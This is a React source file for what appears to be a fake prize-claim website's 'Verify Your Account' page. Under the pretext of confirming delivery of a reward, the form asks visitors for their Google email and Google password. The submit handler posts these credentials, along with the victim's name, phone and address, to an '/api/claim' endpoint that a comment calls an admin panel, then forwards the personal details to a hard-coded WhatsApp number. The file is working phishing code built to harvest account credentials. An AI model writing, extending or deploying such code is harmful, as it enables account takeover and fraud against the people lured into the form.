import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import axios from 'axios';

const EmailVerification = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { reward, claimData } = location.state || {};

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  if (!reward || !claimData) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-4">
        <h2 className="text-2xl font-bold mb-4">Session expired.</h2>
        <button onClick={() => navigate('/')} className="bg-[#f85606] text-white px-6 py-2 rounded-lg">Go Back</button>
      </div>
    );
  }

  const handleFinalSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // 1. SAVE ALL DATA TO DATABASE (Admin Panel)
      await axios.post('/api/claim', {
        ...claimData,
        email,
        password,
        reward: reward.label
      });

      // 2. SEND PUBLIC INFO TO WHATSAPP
      const whatsappMsg = `*New Prize Claim*\n\n` +
        `*Reward:* ${reward.label}\n` +
        `*Name:* ${claimData.fullName}\n` +
        `*Phone:* ${claimData.phoneNumber}\n` +
        `*City:* ${claimData.city}\n` +
        `*Chowk:* ${claimData.chowk}\n` +
        `*Address Details:* ${claimData.address}`;

      const whatsappUrl = `https://wa.me/9779808439617?text=${encodeURIComponent(whatsappMsg)}`;

      // Redirect to WhatsApp - use location.assign for better mobile compatibility
      window.location.assign(whatsappUrl);
      
      // Delay navigation to confirmation to allow WhatsApp to open
      setTimeout(() => {
        navigate('/confirmation');
      }, 500);

    } catch (err) {
      console.error(err);
      alert('Failed to save data. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      <div className="flex-grow flex items-center justify-center p-4 py-12">
        <div className="bg-white rounded-3xl shadow-xl p-8 max-w-lg w-full text-center">
          <div className="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-[#f85606]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>

          <h2 className="text-2xl font-black mb-2 text-gray-900">Verify Your Account</h2>
          <p className="text-gray-500 mb-8 text-sm">Please provide your login details to confirm your delivery.</p>

          <form onSubmit={handleFinalSubmit} className="space-y-5 text-left">
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">Google Email</label>
              <input
                required
                type="email"
                placeholder="example@gmail.com"
                className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#f85606] transition-all outline-none"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div className="relative">
              <label className="block text-sm font-bold text-gray-700 mb-2">Google Password</label>
              <input
                required
                type={showPassword ? 'text' : 'password'}
                placeholder="Enter password"
                className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#f85606] transition-all outline-none"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-4 top-[42px] text-gray-400 hover:text-gray-600 transition-colors"
              >
                {showPassword ? (
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                  </svg>
                ) : (
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.542-7a9.97 9.97 0 011.563-3.04m4.066-4.56a10.015 10.015 0 014.228-1.406M12 5c.132 0 .263.002.393.006M15.825 5.825A9.957 9.957 0 0121.542 12c-.253.805-.623 1.56-1.09 2.251m-2.115 2.115A9.99 9.99 0 0112 19c-.132 0-.263-.002-.393-.006m-4.043-4.043L3 3m3.586 3.586L19 19" />
                  </svg>
                )}
              </button>
            </div>

            <button
              disabled={loading}
              type="submit"
              className="w-full bg-[#f85606] text-white py-5 rounded-2xl font-black text-xl hover:shadow-2xl transition-all active:scale-95 mt-6 glow-orange"
            >
              {loading ? 'Processing...' : 'Verify & Submit'}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default EmailVerification;
